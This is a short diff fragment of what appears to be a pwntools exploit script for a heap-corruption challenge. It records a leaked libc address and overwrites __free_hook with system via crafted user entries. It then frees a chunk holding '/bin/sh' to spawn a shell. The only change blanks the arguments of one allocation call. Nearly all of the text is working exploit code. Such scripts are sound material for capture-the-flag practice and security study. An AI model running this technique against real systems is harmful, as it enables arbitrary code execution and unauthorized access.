@@ -76,7 +76,7 @@ log.info(f"libc address: {hex(libc.address)}")
 
 EditUser(idx2, b"2222", p64(libc.sym["__free_hook"]), b"bbbb", b"bbbb")
 
-idx3 = AddUser(b"user3", b"3333", CONTROL_CHUNK_SIZE, b"CCCC", b"cccc")
+idx3 = AddUser(b"", b"", CONTROL_CHUNK_SIZE, b"", b"")
 idx4 = AddUser(p64(libc.sym["system"]), b"4444", SMALL_CHUNK_SIZE, b"/bin/sh\0", b"dddd")
 
 DeleteUser(idx4, b"4444")
